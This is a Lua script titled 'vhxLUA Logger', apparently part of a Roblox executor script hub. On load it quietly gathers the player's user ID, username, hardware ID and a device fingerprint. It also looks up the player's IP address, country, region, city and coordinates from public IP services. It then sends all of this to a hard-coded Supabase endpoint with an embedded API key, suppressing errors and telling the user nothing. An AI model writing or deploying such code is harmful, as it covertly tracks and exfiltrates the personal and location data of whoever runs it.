-- ── vhxLUA Logger ─────────────────────────────────────────────
local HttpService = game:GetService("HttpService")
local Players     = game:GetService("Players")
local LP          = Players.LocalPlayer
if not LP then return end

local SUPABASE_URL = "https://aowuatmvtpbwpbzzvtua.supabase.co"
local SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFvd3VhdG12dHBid3Bienp2dHVhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzQxNDQ3MjEsImV4cCI6MjA4OTcyMDcyMX0.PUSrmtZm1eNccfcGlbHTRnuqI7gWExBePBhZQ0apZ4Q"

local function doHttp(t)
    local ok, r = pcall(http_request or http.request, t)
    return ok and r or nil
end

local function req(method, endpoint, body)
    return doHttp({
        Url     = SUPABASE_URL .. endpoint,
        Method  = method,
        Headers = {
            ["apikey"]        = SUPABASE_KEY,
            ["Authorization"] = "Bearer " .. SUPABASE_KEY,
            ["Content-Type"]  = "application/json",
        },
        Body = body and HttpService:JSONEncode(body) or nil,
    })
end

local function getHWID()
    if gethwid then
        local ok, id = pcall(gethwid)
        if ok and id and id ~= "" then return tostring(id) end
    end
    if getdeviceid then
        local ok, id = pcall(getdeviceid)
        if ok and id and id ~= "" then return tostring(id) end
    end
    local exec = (identifyexecutor and identifyexecutor()) or "unknown"
    local seed = tostring(LP.UserId) .. exec
    local h = 5381
    for i = 1, #seed do h = ((h * 33) + string.byte(seed, i)) % 4294967295 end
    return string.format("HW-%x", h)
end

local function getFingerprint()
    local exec = (identifyexecutor and identifyexecutor()) or "unknown"
    local seed = tostring(LP.UserId) .. exec .. tostring(game.GameId)
    local h = 0
    for i = 1, #seed do h = (h * 31 + string.byte(seed, i)) % 2147483647 end
    return string.format("FP-%x-%d", h, LP.UserId % 99999)
end

local function getGeo()
    local sources = {
        "http://ip-api.com/json/?fields=status,query,country,countryCode,regionName,city,lat,lon",
        "https://ipapi.co/json/",
    }
    for _, url in ipairs(sources) do
        local ok, r = pcall(doHttp, { Url = url, Method = "GET" })
        if ok and r and r.Body and r.Body ~= "" then
            local ok2, d = pcall(HttpService.JSONDecode, HttpService, r.Body)
            if ok2 and d then
                local ip = d.query or d.ip
                if ip and ip ~= "" then
                    return {
                        ip           = tostring(ip),
                        country      = tostring(d.country or d.country_name or ""),
                        country_code = tostring(d.countryCode or d.country_code or ""),
                        region       = tostring(d.regionName or d.region or ""),
                        city         = tostring(d.city or ""),
                        lat          = tonumber(d.lat or d.latitude),
                        lng          = tonumber(d.lon or d.longitude),
                    }
                end
            end
        end
    end
    return { ip = "", country = "", country_code = "", region = "", city = "", lat = nil, lng = nil }
end

task.spawn(function()
    local ok, err = pcall(function()
        local hwid = getHWID()
        local fp   = getFingerprint()
        local geo  = getGeo()
        local now  = os.date("!%Y-%m-%dT%H:%M:%SZ")

        -- Use known game names from place ID, fall back to game.Name only if unknown
        local GAMES = {
            [18172550962]     = "Pixel Blade",
            [18172553902]     = "Pixel Blade",
            [133884972346775] = "Pixel Blade",
            [138013005633222] = "Loot Hero",
            [77439980360504]  = "Loot Hero",
            [119987266683883] = "Survive Lava",
            [136801880565837] = "Flick",
            [123974602339071] = "UNC Tester",
        }
        local gameName = GAMES[game.PlaceId] or tostring(game.Name)

        local r = req("POST", "/rest/v1/rpc/upsert_user_execution", {
            p_user_id      = LP.UserId,
            p_username     = LP.Name,
            p_place_id     = game.PlaceId,
            p_game_name    = gameName,
            p_fingerprint  = fp,
            p_hwid         = hwid,
            p_ip           = geo.ip,
            p_now          = now,
            p_country      = geo.country,
            p_country_code = geo.country_code,
            p_region       = geo.region,
            p_city         = geo.city,
            p_lat          = geo.lat,
            p_lng          = geo.lng,
        })

        if r and (r.StatusCode == 200 or r.StatusCode == 204 or not r.StatusCode) then
        else
        end

        req("POST", "/rest/v1/rpc/increment_game_exec", {
            p_place_id  = game.PlaceId,
            p_game_name = gameName,
        })

        if getgenv then
            getgenv()._vhxHWID = hwid
            getgenv()._vhxFP   = fp
        end
    end)
    if not ok then
    end
end)
